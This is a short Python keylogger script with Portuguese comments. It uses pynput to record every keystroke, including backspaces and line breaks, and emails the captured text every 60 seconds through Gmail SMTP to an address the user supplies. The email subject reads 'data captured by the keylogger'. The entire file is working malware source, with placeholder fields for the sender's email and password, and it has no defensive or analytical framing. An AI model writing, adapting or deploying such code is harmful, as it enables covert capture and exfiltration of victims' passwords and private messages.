from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configurações de email
EMAIL_ORIGEM = "SEU EMAIL AQUI"
EMAIL_DESTINO = "SEU EMAIL DE DESTINO AQUI"
SENHA_EMAIL = "SUA SENHA AQUI"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
           server = smtplib.SMTP('smtp.gmail.com', 587)
           server.starttls()
           server.login(EMAIL_ORIGEM, SENHA_EMAIL)
           server.send_message(msg)
           server.quit()
           print("Email enviado com sucesso!")
        except Exception as e:
           print("Erro ao enviar email.", e)   
    log = ""

    # Agendar o envio do email a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+= " "
        elif key == keyboard.Key.enter:
            log+= "\n"
        elif key == keyboard.Key.backspace:
            log+= "[<]"
        else:
            pass #ignorar control, shift etc.

#inicia o keylogger e o envio automático

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()